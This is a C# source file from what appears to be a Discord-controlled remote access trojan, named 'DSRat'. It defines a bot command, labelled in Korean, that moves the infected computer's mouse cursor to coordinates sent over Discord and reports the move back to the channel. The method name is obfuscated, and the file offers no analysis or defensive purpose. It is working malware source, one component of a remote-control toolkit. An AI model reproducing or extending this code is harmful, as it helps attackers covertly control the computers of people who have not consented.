using Discord.Commands;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DSRat
{
    public class Mouse : ModuleBase<SocketCommandContext>
    {
        [Command("마우스이동")]
        public async Task sbkbgkdNSKVLJNKLJDBivsirvi32762nsdb(int x, int y)
        {

            Cursor.Position = new Point(x, y);
            await Context.Channel.SendMessageAsync("마우스 위치를" + x + ", " + y + "으로 이동했습니다");
        }
    }
}
